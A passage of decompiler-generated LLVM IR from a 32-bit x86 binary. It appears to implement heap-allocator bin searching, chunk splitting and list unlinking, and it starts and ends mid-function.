  br i1 %v4_8052aa9, label %dec_label_pc_8052b9c.preheader, label %dec_label_pc_8052ab6

dec_label_pc_8052ab6:                             ; preds = %dec_label_pc_8052aa0
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* %stack_var_-92, align 4
  %v2_8052abe = call i32 @function_80531e9(i32* bitcast (i8* @global_var_8064be0.342 to i32*))
  store i32 %v2_8052abe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b9c.preheader

dec_label_pc_8052b9c.preheader:                   ; preds = %dec_label_pc_8052ab6, %dec_label_pc_8052a69, %dec_label_pc_8052aa0
  %stack_var_-40.0.ph = phi i32 [ %v2_8052a6d, %dec_label_pc_8052a69 ], [ %v0_8052aa4, %dec_label_pc_8052ab6 ], [ %v0_8052aa4, %dec_label_pc_8052aa0 ]
  %v1_8052af2 = add i32 %v1_8052db6, 16
  %v0_8052b9c109 = load i32, i32* @global_var_8064c20.346, align 32
  store i32 %v0_8052b9c109, i32* @ebp, align 4
  %v9_8052ba2114 = icmp eq i32 %v0_8052b9c109, 134630420
  %v1_8052ba8116 = icmp eq i1 %v9_8052ba2114, false
  br i1 %v1_8052ba8116, label %dec_label_pc_8052acb, label %dec_label_pc_8052bae

dec_label_pc_8052acb:                             ; preds = %dec_label_pc_8052b9c.preheader, %bb82
  %v0_8052b9c117 = phi i32 [ %v0_8052b9c, %bb82 ], [ %v0_8052b9c109, %dec_label_pc_8052b9c.preheader ]
  %v1_8052acb = add i32 %v0_8052b9c117, 4
  %v2_8052acb = inttoptr i32 %v1_8052acb to i32*
  %v3_8052acb = load i32, i32* %v2_8052acb, align 4
  %v1_8052ace = add i32 %v0_8052b9c117, 12
  %v2_8052ace = inttoptr i32 %v1_8052ace to i32*
  %v3_8052ace = load i32, i32* %v2_8052ace, align 4
  store i32 %v3_8052ace, i32* @edx, align 4
  %v1_8052ad1 = and i32 %v3_8052acb, -4
  store i32 %v1_8052ad1, i32* @edi, align 4
  br i1 %v6_8052a67, label %dec_label_pc_8052afd, label %dec_label_pc_8052ade

dec_label_pc_8052ade:                             ; preds = %dec_label_pc_8052acb
  %v9_8052ade = icmp eq i32 %v3_8052ace, 134630420
  %v1_8052ae4 = icmp eq i1 %v9_8052ade, false
  br i1 %v1_8052ae4, label %dec_label_pc_8052afd, label %dec_label_pc_8052ae6

dec_label_pc_8052ae6:                             ; preds = %dec_label_pc_8052ade
  %v1_8052ae6 = load i32, i32* @global_var_8064c10.344, align 16
  %v12_8052ae6 = icmp eq i32 %v0_8052b9c117, %v1_8052ae6
  %v1_8052aec = icmp eq i1 %v12_8052ae6, false
  br i1 %v1_8052aec, label %dec_label_pc_8052afd, label %dec_label_pc_8052aee

dec_label_pc_8052aee:                             ; preds = %dec_label_pc_8052ae6
  store i32 %v1_8052af2, i32* %eax.global-to-local, align 4
  %v6_8052af7 = icmp ugt i32 %v1_8052ad1, %v1_8052af2
  br i1 %v6_8052af7, label %dec_label_pc_80530dc, label %dec_label_pc_8052afd

dec_label_pc_8052afd:                             ; preds = %dec_label_pc_8052aee, %dec_label_pc_8052ae6, %dec_label_pc_8052ade, %dec_label_pc_8052acb
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8052ace, i32* @global_var_8064c20.346, align 4
  %v2_8052b05 = add i32 %v3_8052ace, 8
  %v3_8052b05 = inttoptr i32 %v2_8052b05 to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v3_8052b05, align 4
  %v0_8052b08 = load i32, i32* @edi, align 4
  %v15_8052b08 = icmp eq i32 %v0_8052b08, %v1_8052db6
  br i1 %v15_8052b08, label %dec_label_pc_805311d, label %dec_label_pc_8052b12

dec_label_pc_8052b12:                             ; preds = %dec_label_pc_8052afd
  %v6_8052b18 = icmp ugt i32 %v0_8052b08, 255
  br i1 %v6_8052b18, label %dec_label_pc_8052b2b, label %dec_label_pc_8052b1a

dec_label_pc_8052b1a:                             ; preds = %dec_label_pc_8052b12
  %v2_8052b1c = udiv i32 %v0_8052b08, 8
  store i32 %v2_8052b1c, i32* %esi.global-to-local, align 4
  %v1_8052b1f = mul nuw i32 %v2_8052b1c, 8
  %v2_8052b1f = add i32 %v1_8052b1f, 134630412
  store i32 %v2_8052b1f, i32* @ebx, align 4
  %v1_8052b26 = add i32 %v1_8052b1f, 134630420
  %v2_8052b26 = inttoptr i32 %v1_8052b26 to i32*
  %v3_8052b26 = load i32, i32* %v2_8052b26, align 4
  store i32 %v3_8052b26, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b74

dec_label_pc_8052b2b:                             ; preds = %dec_label_pc_8052b12
  store i32 %v0_8052b08, i32* @eax, align 4
  %v0_8052b2d = call i32 @function_8052994()
  store i32 %v0_8052b2d, i32* %esi.global-to-local, align 4
  %v1_8052b34 = mul i32 %v0_8052b2d, 8
  %v2_8052b34 = add i32 %v1_8052b34, ptrtoint (i32* @global_var_8064c0c.343 to i32)
  store i32 %v2_8052b34, i32* %eax.global-to-local, align 4
  %v1_8052b3b = add i32 %v1_8052b34, add (i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), i32 8)
  %v2_8052b3b = inttoptr i32 %v1_8052b3b to i32*
  %v3_8052b3b = load i32, i32* %v2_8052b3b, align 4
  store i32 %v3_8052b3b, i32* %edx.global-to-local, align 4
  %v12_8052b3e = icmp eq i32 %v3_8052b3b, %v2_8052b34
  store i32 %v3_8052b3b, i32* @ebx, align 4
  br i1 %v12_8052b3e, label %dec_label_pc_8052b74, label %dec_label_pc_8052b48

dec_label_pc_8052b48:                             ; preds = %dec_label_pc_8052b2b
  %v1_8052b48 = add i32 %v1_8052b34, add (i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), i32 12)
  %v2_8052b48 = inttoptr i32 %v1_8052b48 to i32*
  %v3_8052b48 = load i32, i32* %v2_8052b48, align 4
  store i32 %v3_8052b48, i32* @ebx, align 4
  %v0_8052b4b = load i32, i32* @edi, align 4
  %v2_8052b4b = add i32 %v3_8052b48, 4
  %v3_8052b4b = inttoptr i32 %v2_8052b4b to i32*
  %v4_8052b4b = load i32, i32* %v3_8052b4b, align 4
  %v10_8052b4b = icmp ult i32 %v0_8052b4b, %v4_8052b4b
  %v1_8052b4e = icmp eq i1 %v10_8052b4b, false
  br i1 %v1_8052b4e, label %dec_label_pc_8052b56, label %dec_label_pc_8052b74

dec_label_pc_8052b56:                             ; preds = %dec_label_pc_8052b48
  %v1_8052b58 = or i32 %v0_8052b4b, 1
  store i32 %v1_8052b58, i32* %eax.global-to-local, align 4
  store i32 %v3_8052b3b, i32* %ebx.global-to-local, align 4
  %v2_8052b6c101 = add i32 %v3_8052b3b, 4
  %v3_8052b6c102 = inttoptr i32 %v2_8052b6c101 to i32*
  %v4_8052b6c103 = load i32, i32* %v3_8052b6c102, align 4
  %v10_8052b6c105 = icmp ult i32 %v1_8052b58, %v4_8052b6c103
  br i1 %v10_8052b6c105, label %dec_label_pc_8052b5d, label %dec_label_pc_8052b71

dec_label_pc_8052b5d:                             ; preds = %dec_label_pc_8052b56, %dec_label_pc_8052b5d
  %v0_8052b71106 = phi i32 [ %v3_8052b61, %dec_label_pc_8052b5d ], [ %v3_8052b3b, %dec_label_pc_8052b56 ]
  store i32 %v0_8052b71106, i32* %ecx.global-to-local, align 4
  %v1_8052b61 = add i32 %v0_8052b71106, 8
  %v2_8052b61 = inttoptr i32 %v1_8052b61 to i32*
  %v3_8052b61 = load i32, i32* %v2_8052b61, align 4
  store i32 %v3_8052b61, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052b61, i32* %ebx.global-to-local, align 4
  %v2_8052b6c = add i32 %v3_8052b61, 4
  %v3_8052b6c = inttoptr i32 %v2_8052b6c to i32*
  %v4_8052b6c = load i32, i32* %v3_8052b6c, align 4
  %v10_8052b6c = icmp ult i32 %v1_8052b58, %v4_8052b6c
  br i1 %v10_8052b6c, label %dec_label_pc_8052b5d, label %dec_label_pc_8052b71

dec_label_pc_8052b71:                             ; preds = %dec_label_pc_8052b5d, %dec_label_pc_8052b56
  %v0_8052b71.lcssa = phi i32 [ %v3_8052b3b, %dec_label_pc_8052b56 ], [ %v3_8052b61, %dec_label_pc_8052b5d ]
  %v1_8052b71 = add i32 %v0_8052b71.lcssa, 12
  %v2_8052b71 = inttoptr i32 %v1_8052b71 to i32*
  %v3_8052b71 = load i32, i32* %v2_8052b71, align 4
  store i32 %v3_8052b71, i32* @ebx, align 4
  br label %dec_label_pc_8052b74

dec_label_pc_8052b74:                             ; preds = %dec_label_pc_8052b1a, %dec_label_pc_8052b48, %dec_label_pc_8052b2b, %dec_label_pc_8052b71
  %v0_8052b74 = phi i32 [ %v0_8052b2d, %dec_label_pc_8052b2b ], [ %v0_8052b2d, %dec_label_pc_8052b71 ], [ %v0_8052b2d, %dec_label_pc_8052b48 ], [ %v2_8052b1c, %dec_label_pc_8052b1a ]
  %stack_var_-64.1 = phi i32 [ %v3_8052b3b, %dec_label_pc_8052b2b ], [ %v0_8052b71.lcssa, %dec_label_pc_8052b71 ], [ %v2_8052b34, %dec_label_pc_8052b48 ], [ %v3_8052b26, %dec_label_pc_8052b1a ]
  %v1_8052b76 = urem i32 %v0_8052b74, 32
  %v2_8052b76 = icmp eq i32 %v1_8052b76, 0
  store i32 %v1_8052b76, i32* %esi.global-to-local, align 4
  store i32 %v1_8052b76, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052b80 = sdiv i32 %v0_8052b74, 32
  store i32 %v2_8052b80, i32* %edx.global-to-local, align 4
  br i1 %v2_8052b76, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_8052b74
  %v5_8052b83 = shl i32 1, %v1_8052b76
  store i32 %v5_8052b83, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_8052b74, %bb
  %v5_8052b85 = phi i32 [ 1, %dec_label_pc_8052b74 ], [ %v5_8052b83, %bb ]
  %v1_8052b85 = mul nsw i32 %v2_8052b80, 4
  %v2_8052b85 = add i32 %v1_8052b85, ptrtoint (i32* @global_var_8064f14.347 to i32)
  %v3_8052b85 = inttoptr i32 %v2_8052b85 to i32*
  %v4_8052b85 = load i32, i32* %v3_8052b85, align 4
  %v6_8052b85 = or i32 %v4_8052b85, %v5_8052b85
  store i32 %v6_8052b85, i32* %v3_8052b85, align 4
  %v0_8052b8c = load i32, i32* @ebx, align 4
  %v1_8052b8c = load i32, i32* @ebp, align 4
  %v2_8052b8c = add i32 %v1_8052b8c, 12
  %v3_8052b8c = inttoptr i32 %v2_8052b8c to i32*
  store i32 %v0_8052b8c, i32* %v3_8052b8c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052b93 = load i32, i32* @ebp, align 4
  %v2_8052b93 = add i32 %v1_8052b93, 8
  %v3_8052b93 = inttoptr i32 %v2_8052b93 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052b93, align 4
  %v0_8052b96 = load i32, i32* @ebp, align 4
  %v1_8052b96 = load i32, i32* @esi, align 4
  %v2_8052b96 = add i32 %v1_8052b96, 12
  %v3_8052b96 = inttoptr i32 %v2_8052b96 to i32*
  store i32 %v0_8052b96, i32* %v3_8052b96, align 4
  %v0_8052b99 = load i32, i32* @ebp, align 4
  %v1_8052b99 = load i32, i32* @ebx, align 4
  %v2_8052b99 = add i32 %v1_8052b99, 8
  %v3_8052b99 = inttoptr i32 %v2_8052b99 to i32*
  store i32 %v0_8052b99, i32* %v3_8052b99, align 4
  %v0_8052b9c = load i32, i32* @global_var_8064c20.346, align 32
  store i32 %v0_8052b9c, i32* @ebp, align 4
  %v9_8052ba2 = icmp eq i32 %v0_8052b9c, 134630420
  %v1_8052ba8 = icmp eq i1 %v9_8052ba2, false
  br i1 %v1_8052ba8, label %dec_label_pc_8052acb, label %dec_label_pc_8052bae

dec_label_pc_8052bae:                             ; preds = %bb82, %dec_label_pc_8052b9c.preheader
  br i1 %v8_8052a5f, label %dec_label_pc_8052c3c, label %dec_label_pc_8052bbc

dec_label_pc_8052bbc:                             ; preds = %dec_label_pc_8052bae
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052bc0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052bc0 = add i32 %v1_8052bc0, ptrtoint (i32* @global_var_8064c0c.343 to i32)
  store i32 %v2_8052bc0, i32* %edx.global-to-local, align 4
  %v1_8052bc7 = add i32 %v1_8052bc0, add (i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), i32 12)
  %v2_8052bc7 = inttoptr i32 %v1_8052bc7 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052bc7, align 4
  br label %dec_label_pc_8052c38

dec_label_pc_8052bcc:                             ; preds = %dec_label_pc_8052c38
  %v1_8052bcc = add i32 %v4_8052be3, 4
  %v2_8052bcc = inttoptr i32 %v1_8052bcc to i32*
  %v3_8052bcc = load i32, i32* %v2_8052bcc, align 4
  store i32 %v3_8052bcc, i32* %ebx.global-to-local, align 4
  %v1_8052bcf = add i32 %v4_8052be3, 12
  %v2_8052bcf = inttoptr i32 %v1_8052bcf to i32*
  %v3_8052bcf = load i32, i32* %v2_8052bcf, align 4
  store i32 %v3_8052bcf, i32* @ecx, align 4
  %v1_8052bd2 = and i32 %v3_8052bcc, -4
  store i32 %v1_8052bd2, i32* @ebx, align 4
  %v10_8052bd5 = icmp ult i32 %v1_8052bd2, %v1_8052db6
  br i1 %v10_8052bd5, label %dec_label_pc_8052c38, label %dec_label_pc_8052bdb

dec_label_pc_8052bdb:                             ; preds = %dec_label_pc_8052bcc
  %v1_8052bdb = add i32 %v4_8052be3, 8
  %v2_8052bdb = inttoptr i32 %v1_8052bdb to i32*
  %v3_8052bdb = load i32, i32* %v2_8052bdb, align 4
  store i32 %v3_8052bdb, i32* @edx, align 4
  %v1_8052bde = add i32 %v3_8052bdb, 12
  %v2_8052bde = inttoptr i32 %v1_8052bde to i32*
  %v3_8052bde = load i32, i32* %v2_8052bde, align 4
  %v15_8052bde = icmp eq i32 %v3_8052bde, %v4_8052be3
  %v1_8052be1 = icmp eq i1 %v15_8052bde, false
  br i1 %v1_8052be1, label %dec_label_pc_8052be8, label %dec_label_pc_8052be3

dec_label_pc_8052be3:                             ; preds = %dec_label_pc_8052bdb
  %v1_8052be3 = add i32 %v3_8052bcf, 8
  %v2_8052be3 = inttoptr i32 %v1_8052be3 to i32*
  %v3_8052be3 = load i32, i32* %v2_8052be3, align 4
  %v15_8052be3 = icmp eq i32 %v3_8052be3, %v4_8052be3
  br i1 %v15_8052be3, label %dec_label_pc_8052bed, label %dec_label_pc_8052be8

dec_label_pc_8052be8:                             ; preds = %dec_label_pc_8052be3, %dec_label_pc_8052bdb
  %v0_8052be8 = call i32 @function_8053550()
  store i32 %v0_8052be8, i32* %eax.global-to-local, align 4
  %v0_8052bed.pre = load i32, i32* @ebx, align 4
  %v0_8052bf3.pre = load i32, i32* @ecx, align 4
  %v1_8052bf3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052bed

dec_label_pc_8052bed:                             ; preds = %dec_label_pc_8052be3, %dec_label_pc_8052be8
  %v1_8052bf3 = phi i32 [ %v3_8052bdb, %dec_label_pc_8052be3 ], [ %v1_8052bf3.pre, %dec_label_pc_8052be8 ]
  %v0_8052bf3 = phi i32 [ %v3_8052bcf, %dec_label_pc_8052be3 ], [ %v0_8052bf3.pre, %dec_label_pc_8052be8 ]
  %v0_8052bed = phi i32 [ %v1_8052bd2, %dec_label_pc_8052be3 ], [ %v0_8052bed.pre, %dec_label_pc_8052be8 ]
  %v5_8052bef = sub i32 %v0_8052bed, %v1_8052db6
  store i32 %v5_8052bef, i32* %esi.global-to-local, align 4
  %v2_8052bf3 = add i32 %v1_8052bf3, 12
  %v3_8052bf3 = inttoptr i32 %v2_8052bf3 to i32*
  store i32 %v0_8052bf3, i32* %v3_8052bf3, align 4
  %v0_8052bf6 = load i32, i32* @edx, align 4
  %v1_8052bf6 = load i32, i32* @ecx, align 4
  %v2_8052bf6 = add i32 %v1_8052bf6, 8
  %v3_8052bf6 = inttoptr i32 %v2_8052bf6 to i32*
  store i32 %v0_8052bf6, i32* %v3_8052bf6, align 4
  %v0_8052bf9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bf9 = add i32 %v0_8052bf9, 8
  store i32 %v1_8052bf9, i32* @ecx, align 4
  %v0_8052bfc = load i32, i32* %esi.global-to-local, align 4
  %tmp136 = icmp ult i32 %v0_8052bfc, 16
  br i1 %tmp136, label %dec_label_pc_805312b, label %dec_label_pc_8052c05

dec_label_pc_8052c05:                             ; preds = %dec_label_pc_8052bed
  %v2_8052c09 = add i32 %v0_8052bf9, %v1_8052db6
  store i32 %v2_8052c09, i32* @edx, align 4
  %v1_8052c0c = or i32 %v1_8052db6, 1
  store i32 %v1_8052c0c, i32* %ebx.global-to-local, align 4
  %v2_8052c0f = add i32 %v0_8052bf9, 4
  %v3_8052c0f = inttoptr i32 %v2_8052c0f to i32*
  store i32 %v1_8052c0c, i32* %v3_8052c0f, align 4
  %v0_8052c12 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c14 = or i32 %v0_8052c12, 1
  store i32 %v1_8052c14, i32* %eax.global-to-local, align 4
  %v0_8052c17 = load i32, i32* @edx, align 4
  %v1_8052c17 = load i32, i32* @ebp, align 4
  %v2_8052c17 = add i32 %v1_8052c17, 8
  %v3_8052c17 = inttoptr i32 %v2_8052c17 to i32*
  store i32 %v0_8052c17, i32* %v3_8052c17, align 4
  %v0_8052c1a = load i32, i32* @edx, align 4
  %v1_8052c1a = load i32, i32* @ebp, align 4
  %v2_8052c1a = add i32 %v1_8052c1a, 12
  %v3_8052c1a = inttoptr i32 %v2_8052c1a to i32*
  store i32 %v0_8052c1a, i32* %v3_8052c1a, align 4
  %v0_8052c1d = load i32, i32* @edx, align 4
  %v1_8052c1d = add i32 %v0_8052c1d, 8
  %v2_8052c1d = inttoptr i32 %v1_8052c1d to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_8052c1d, align 4
  %v0_8052c24 = load i32, i32* @edx, align 4
  %v1_8052c24 = add i32 %v0_8052c24, 12
  %v2_8052c24 = inttoptr i32 %v1_8052c24 to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_8052c24, align 4
  %v0_8052c2b = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c2b = load i32, i32* @edx, align 4
  %v2_8052c2b = add i32 %v1_8052c2b, 4
  %v3_8052c2b = inttoptr i32 %v2_8052c2b to i32*
  store i32 %v0_8052c2b, i32* %v3_8052c2b, align 4
  %v0_8052c2e = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c2e = load i32, i32* @edx, align 4
  %v3_8052c2e = add i32 %v1_8052c2e, %v0_8052c2e
  %v4_8052c2e = inttoptr i32 %v3_8052c2e to i32*
  store i32 %v0_8052c2e, i32* %v4_8052c2e, align 4
  br label %dec_label_pc_8053130

dec_label_pc_8052c38:                             ; preds = %dec_label_pc_8052bcc, %dec_label_pc_8052bbc
  %v4_8052be3 = phi i32 [ %storemerge1.pre, %dec_label_pc_8052bbc ], [ %v3_8052bcf, %dec_label_pc_8052bcc ]
  store i32 %v4_8052be3, i32* %eax.global-to-local, align 4
  %v12_8052c38 = icmp eq i32 %v4_8052be3, %v2_8052bc0
  %v1_8052c3a = icmp eq i1 %v12_8052c38, false
  br i1 %v1_8052c3a, label %dec_label_pc_8052bcc, label %dec_label_pc_8052c3c.loopexit

dec_label_pc_8052c3c.loopexit:                    ; preds = %dec_label_pc_8052c38
  br label %dec_label_pc_8052c3c

dec_label_pc_8052c3c:                             ; preds = %dec_label_pc_8052c3c.loopexit, %dec_label_pc_8052bae
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052c45 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8052c45, i32* %ecx.global-to-local, align 4
  %v2_8052c48 = udiv i32 %v1_8052c45, 32
  store i32 %v2_8052c48, i32* @edi, align 4
  %v1_8052c4b = mul nuw nsw i32 %v2_8052c48, 4
  %v2_8052c4b = add i32 %v1_8052c4b, ptrtoint (i32* @global_var_8064f14.347 to i32)
  %v3_8052c4b = inttoptr i32 %v2_8052c4b to i32*
  %v4_8052c4b = load i32, i32* %v3_8052c4b, align 4
  store i32 %v4_8052c4b, i32* %edx.global-to-local, align 4
  %v1_8052c52 = mul i32 %v1_8052c45, 8
  %v2_8052c52 = add i32 %v1_8052c52, ptrtoint (i32* @global_var_8064c0c.343 to i32)
  store i32 %v2_8052c52, i32* %ebx.global-to-local, align 4
  %v1_8052c59 = urem i32 %v1_8052c45, 32
  %v2_8052c59 = icmp eq i32 %v1_8052c59, 0
  store i32 %v1_8052c59, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052c59, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8052c3c
  %v5_8052c5c = shl i32 1, %v1_8052c59
  store i32 %v5_8052c5c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052c3c, %bb83, %dec_label_pc_8052c9d
  %v1_8052c5e = phi i32 [ %v1_8052c5e.pre, %dec_label_pc_8052c9d ], [ %v4_8052c4b, %bb83 ], [ %v4_8052c4b, %dec_label_pc_8052c3c ]
  %v0_8052c62 = phi i32 [ %v0_8052c5e.pre, %dec_label_pc_8052c9d ], [ %v5_8052c5c, %bb83 ], [ 1, %dec_label_pc_8052c3c ]
  %tmp84 = icmp ule i32 %v0_8052c62, %v1_8052c5e
  %v1_8052c62 = icmp eq i32 %v0_8052c62, 0
  %v1_8052c64 = icmp eq i1 %v1_8052c62, false
  %or.cond = and i1 %tmp84, %v1_8052c64
  br i1 %or.cond, label %dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge, label %dec_label_pc_8052c66.preheader

dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge: ; preds = %.preheader
  %v0_8052c8d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c92.preheader

dec_label_pc_8052c66.preheader:                   ; preds = %.preheader
  %v0_8052c66.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052c66

dec_label_pc_8052c66:                             ; preds = %dec_label_pc_8052c66.preheader, %dec_label_pc_8052c70
  %v0_8052c66 = phi i32 [ %v0_8052c66.pre, %dec_label_pc_8052c66.preheader ], [ %v1_8052c66, %dec_label_pc_8052c70 ]
  %v1_8052c66 = add i32 %v0_8052c66, 1
  store i32 %v1_8052c66, i32* @edi, align 4
  %v6_8052c6a = icmp ugt i32 %v1_8052c66, 2
  br i1 %v6_8052c6a, label %dec_label_pc_8052d21.loopexit, label %dec_label_pc_8052c70

dec_label_pc_8052c70:                             ; preds = %dec_label_pc_8052c66
  %v1_8052c70 = mul i32 %v1_8052c66, 4
  %v2_8052c70 = add i32 %v1_8052c70, ptrtoint (i32* @global_var_8064f14.347 to i32)
  %v3_8052c70 = inttoptr i32 %v2_8052c70 to i32*
  %v4_8052c70 = load i32, i32* %v3_8052c70, align 4
  store i32 %v4_8052c70, i32* %edx.global-to-local, align 4
  %v1_8052c77 = icmp eq i32 %v4_8052c70, 0
  br i1 %v1_8052c77, label %dec_label_pc_8052c66, label %dec_label_pc_8052c7b

dec_label_pc_8052c7b:                             ; preds = %dec_label_pc_8052c70
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052c82 = mul i32 %v1_8052c66, 256
  store i32 %v2_8052c82, i32* %eax.global-to-local, align 4
  %v1_8052c85 = add i32 %v2_8052c82, ptrtoint (i32* @global_var_8064c0c.343 to i32)
  store i32 %v1_8052c85, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c92.preheader

dec_label_pc_8052c92.preheader:                   ; preds = %dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge, %dec_label_pc_8052c7b
  %v0_8052c8d12 = phi i32 [ %v1_8052c85, %dec_label_pc_8052c7b ], [ %v0_8052c8d12.pre, %dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052c7b ], [ %v0_8052c62, %dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge ]
  %v0_8052ca3 = phi i32 [ %v4_8052c70, %dec_label_pc_8052c7b ], [ %v1_8052c5e, %dec_label_pc_8052c62.dec_label_pc_8052c92.preheader_crit_edge ]
  %v2_8052c924 = and i32 %v0_8052ca3, %esi.promoted
  %v3_8052c925 = icmp eq i32 %v2_8052c924, 0
  br i1 %v3_8052c925, label %dec_label_pc_8052c8d, label %dec_label_pc_8052c96

dec_label_pc_8052c8d:                             ; preds = %dec_label_pc_8052c92.preheader, %dec_label_pc_8052c8d
  %v2_8052c9014 = phi i32 [ %v2_8052c90, %dec_label_pc_8052c8d ], [ %esi.promoted, %dec_label_pc_8052c92.preheader ]
  %v0_8052c8d13 = phi i32 [ %v1_8052c8d, %dec_label_pc_8052c8d ], [ %v0_8052c8d12, %dec_label_pc_8052c92.preheader ]
  %v1_8052c8d = add i32 %v0_8052c8d13, 8
  %v2_8052c90 = mul i32 %v2_8052c9014, 2
  %v2_8052c92 = and i32 %v2_8052c90, %v0_8052ca3
  %v3_8052c92 = icmp eq i32 %v2_8052c92, 0
  br i1 %v3_8052c92, label %dec_label_pc_8052c8d, label %dec_label_pc_8052c92.dec_label_pc_8052c96_crit_edge

dec_label_pc_8052c92.dec_label_pc_8052c96_crit_edge: ; preds = %dec_label_pc_8052c8d
  store i32 %v1_8052c8d, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052c90, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052c96

dec_label_pc_8052c96:                             ; preds = %dec_label_pc_8052c92.dec_label_pc_8052c96_crit_edge, %dec_label_pc_8052c92.preheader
  %v0_8052c9d = phi i32 [ %v2_8052c90, %dec_label_pc_8052c92.dec_label_pc_8052c96_crit_edge ], [ %esi.promoted, %dec_label_pc_8052c92.preheader ]
  %v1_8052cc0 = phi i32 [ %v1_8052c8d, %dec_label_pc_8052c92.dec_label_pc_8052c96_crit_edge ], [ %v0_8052c8d12, %dec_label_pc_8052c92.preheader ]
  %v1_8052c96 = add i32 %v1_8052cc0, 12
  %v2_8052c96 = inttoptr i32 %v1_8052c96 to i32*
  %v3_8052c96 = load i32, i32* %v2_8052c96, align 4
  store i32 %v3_8052c96, i32* @ecx, align 4
  %v12_8052c99 = icmp eq i32 %v3_8052c96, %v1_8052cc0
  %v1_8052c9b = icmp eq i1 %v12_8052c99, false
  br i1 %v1_8052c9b, label %dec_label_pc_8052cb1, label %dec_label_pc_8052c9d

dec_label_pc_8052c9d:                             ; preds = %dec_label_pc_8052c96
  %v2_8052c9f = mul i32 %v0_8052c9d, 2
  store i32 %v2_8052c9f, i32* %esi.global-to-local, align 4
  %v1_8052ca1 = sub i32 -1, %v0_8052c9d
  store i32 %v1_8052ca1, i32* %eax.global-to-local, align 4
  %v2_8052ca3 = and i32 %v0_8052ca3, %v1_8052ca1
  store i32 %v2_8052ca3, i32* %edx.global-to-local, align 4
  %v1_8052ca5 = add i32 %v3_8052c96, 8
  store i32 %v1_8052ca5, i32* %ebx.global-to-local, align 4
  %v1_8052ca8 = load i32, i32* @edi, align 4
  %v2_8052ca8 = mul i32 %v1_8052ca8, 4
  %v3_8052ca8 = add i32 %v2_8052ca8, ptrtoint (i32* @global_var_8064f14.347 to i32)
  %v4_8052ca8 = inttoptr i32 %v3_8052ca8 to i32*
  store i32 %v2_8052ca3, i32* %v4_8052ca8, align 4
  %v0_8052c5e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c5e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052cb1:                             ; preds = %dec_label_pc_8052c96
  %v1_8052cb1 = add i32 %v3_8052c96, 4
  %v2_8052cb1 = inttoptr i32 %v1_8052cb1 to i32*
  %v3_8052cb1 = load i32, i32* %v2_8052cb1, align 4
  store i32 %v3_8052cb1, i32* %edx.global-to-local, align 4
  %v1_8052cb4 = add i32 %v3_8052c96, 12
  %v2_8052cb4 = inttoptr i32 %v1_8052cb4 to i32*
  %v3_8052cb4 = load i32, i32* %v2_8052cb4, align 4
  store i32 %v3_8052cb4, i32* %eax.global-to-local, align 4
  %v1_8052cb7 = and i32 %v3_8052cb1, -4
  store i32 %v1_8052cb7, i32* @edx, align 4
  %v5_8052cbc = sub i32 %v1_8052cb7, %v1_8052db6
  store i32 %v5_8052cbc, i32* %esi.global-to-local, align 4
  store i32 %v3_8052cb4, i32* %v2_8052c96, align 4
  %v0_8052cc3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052cc3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052cc3 = add i32 %v1_8052cc3, 8
  %v3_8052cc3 = inttoptr i32 %v2_8052cc3 to i32*
  store i32 %v0_8052cc3, i32* %v3_8052cc3, align 4
  %v0_8052cc6 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8052cc6, 16
  %v0_8052ccb = load i32, i32* @ecx, align 4
  br i1 %tmp137, label %dec_label_pc_8052ccb, label %dec_label_pc_8052cd2

dec_label_pc_8052ccb:                             ; preds = %dec_label_pc_8052cb1
  %v1_8052ccb = load i32, i32* @edx, align 4
  %v2_8052ccb = add i32 %v0_8052ccb, 4
  %v3_8052ccb = add i32 %v2_8052ccb, %v1_8052ccb
  %v4_8052ccb = inttoptr i32 %v3_8052ccb to i32*
  %v5_8052ccb = load i32, i32* %v4_8052ccb, align 4
